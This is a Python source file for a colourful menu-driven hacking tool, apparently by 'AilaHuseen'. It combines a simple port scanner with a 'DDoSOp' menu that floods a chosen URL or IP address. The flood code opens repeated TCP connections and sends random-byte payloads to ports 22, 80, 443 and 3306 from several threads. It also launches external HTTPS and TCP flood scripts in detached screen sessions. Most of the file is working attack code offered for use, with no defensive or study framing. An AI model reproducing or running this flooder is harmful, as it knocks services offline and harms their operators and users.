import socket
from os import system
import sys
import colorama
import time
import subprocess
import threading
import random

class Color:
    colorama.init(autoreset=True)
    LG = colorama.Fore.LIGHTGREEN_EX
    LR = colorama.Fore.LIGHTRED_EX
    LC = colorama.Fore.LIGHTCYAN_EX
    LB = colorama.Fore.LIGHTBLUE_EX
    RESET = colorama.Fore.RESET

class Home:
    def __init__(self, dev):
        self.dev = dev
        self.tool = Tool()

    def home(self):
        system('clear')
        print(f"""
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⢀⠀⠀⠀⠊⣉⡉⠄⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠠⠂⠀⣀⠠⡀⠈⠀⡀⠀⠀⠂⠄⠀⢀⠀
        ⠀⠁⠉⠉⠁⠀⠀⠀⠌⠉⠙⠀⠀⠀⠐⠉⠉⠀⠃
        ⠀⢇⠈⠉⠀⠂⠀⠀⠀⠉⠁⡀⠀⠀⠇⠈⠉⠀⠂
        ⠈⢀⠒⠒⠊⠀⠉Welcome⠁⠐⠒⠒⠂⠂
        ⠀⠆⠘⠙⠀⠀⠀⠀To the⠀⠆⠘⠛⢈⠀
        ⠀⠈⠖⠒⠂ Tool-Slef⠒⠒⠂⠄
        ⠀⡆⠐⠒⠀⠄⠀⠀⠀⠒⠂⠀⠀⠀⡆⠐⠒⠀⠄
        ⠐⡈⠤⠤⠔⠀⠒⠀⡢⠤⠤⠁⠒⠂⠠⠤⠤⠤⠄
        ⠀⠀⠀⠈⠄⠀⠀⠐⠀⠶⠆⠡⠀⠀⠄⠂⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠂⠄⠀⠀⠂⠁⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        """)
        print(Color.LC+"")
        print(Color.LR+"["+Color.LG+"1"+Color.LR+"]"+Color.LC+" - Check Ports")
        print(Color.LR+"["+Color.LG+"2"+Color.LR+"]"+Color.LC+" - DDoSOp")
        print(Color.LR+"["+Color.LG+"3"+Color.LR+"]"+Color.LC+" - Developer Info")
        print(Color.LR+"["+Color.LG+"0"+Color.LR+"]"+Color.LC+" - Go to Home")

        while True:
            option = input(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
            if option == "1":
                system('clear');self.tool.check_ports_menu()
            elif option == "2":
                system('clear');self.tool.ddos_op_menu()
            elif option == "3":
                system('clear');self.dev_info_menu()
            elif option == "0":
                system('clear');self.home()
            elif option.lower() == "exit":
                sys.exit()
            else:
                print(Color.LR+"Command not recognized")

    def dev_info_menu(self):
        while True:
            system('clear')
            print(f"{Color.LG}{self.dev}")
            print(Color.LR+"["+Color.LG+"0"+Color.LR+"]"+Color.LC+" - Go to Home\n")
            option = input(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Developer Info"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
            if option == "0":
                system('clear');self.home()
            else:
                print(Color.LR+"Invalid Option")

class Tool:
    def check_ports_menu(self):
        while True:
            system('clear')
            print(Color.LR+"["+Color.LG+"1"+Color.LR+"]"+Color.LC+" - Port Scanner")
            print(Color.LR+"["+Color.LG+"0"+Color.LR+"]"+Color.LC+" - Go to Home\n")

            option = input(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"Check Ports"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
            if option == "1":
                system('clear');self.perform_port_scan()
            elif option == "0":
                system('clear');Home(dev_info).home()
            else:
                print(Color.LR+"Invalid Option")

    def perform_port_scan(self):
        target = input(f"{Color.LG}Enter target IP address to check ports: {Color.RESET}")
        ports = [7777, 21, 22, 23, 25, 45, 53, 80, 110, 443, 3306, 8080]
        print(f"{Color.LC}Checking ports for {target}...\n")

        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"{Color.LG}Port {port} is open.")
            else:
                print(f"{Color.LR}Port {port} is closed.")
            sock.close()
            time.sleep(0.1)

        input("\nPress Enter to go back")
        self.check_ports_menu()

    def ddos_op_menu(self):
        while True:
            system('clear')
            print(Color.LR+"["+Color.LG+"1"+Color.LR+"]"+Color.LC+" - Start DDoS Attack")
            print(Color.LR+"["+Color.LG+"2"+Color.LR+"]"+Color.LC+" - Attack Specific")
            print(Color.LR+"["+Color.LG+"0"+Color.LR+"]"+Color.LC+" - Go to Home\n")

            option = input(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"DDoSOp"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
            if option == "1":
                url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
                floodtime = int(input(f"{Color.LG} [>] Time (seconds): "+Color.RESET))
                subprocess.run([f'screen -dm node Aila/A7/AilaHttps {url} {floodtime} 1'], shell=True)
                print(Color.LG+f"\n [!] Attack sent successfully!\n")
                time.sleep(2)  # انتظر 2 ثانية قبل العودة للخيارات
            elif option == "2":
                ip = input(f"{Color.LG} [>] IP: "+Color.RESET)
                floodtime = int(input(f"{Color.LG} [>] Time (seconds): "+Color.RESET))
                size = int(input(f"{Color.LG} [>] Packet Size: "+Color.RESET))
                ports = [22, 80, 443, 3306]  # Ports to attack
                threads = []

                print(Color.LG + "\n [!] Attack started on specified ports...\n")
                # Start a thread for each port
                for port in ports:
                    thread = threading.Thread(target=self.tcp_attack, args=(ip, port, floodtime, size))
                    threads.append(thread)
                    thread.start()

                # Wait for all threads to complete
                for thread in threads:
                    thread.join()

                # بعد إكمال هجوم TCP، قم بتشغيل الأمر
                subprocess.run([f'screen -dm python3 Aila/A7/AilaT {ip} {ports[-1]} {floodtime} {size} {len(ports)}'], shell=True)

                print(Color.LG + "\n [!] Attack sent successfully!\n")
                time.sleep(2)  # انتظر 2 ثانية قبل العودة للخيارات
            elif option == "0":
                system('clear');Home(dev_info).home()
            else:
                print(Color.LR+"Invalid Option")

    def tcp_attack(self, ip, port, floodtime, size):
        end_time = time.time() + floodtime
        while time.time() < end_time:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                try:
                    sock.connect((ip, port))
                    sock.send(random._urandom(size))
                except:
                    pass

# تشغيل البرنامج
dev_info = f"{Color.LC}By{Color.LR}: {Color.LG}AilaHuseen"
Home(dev_info).home()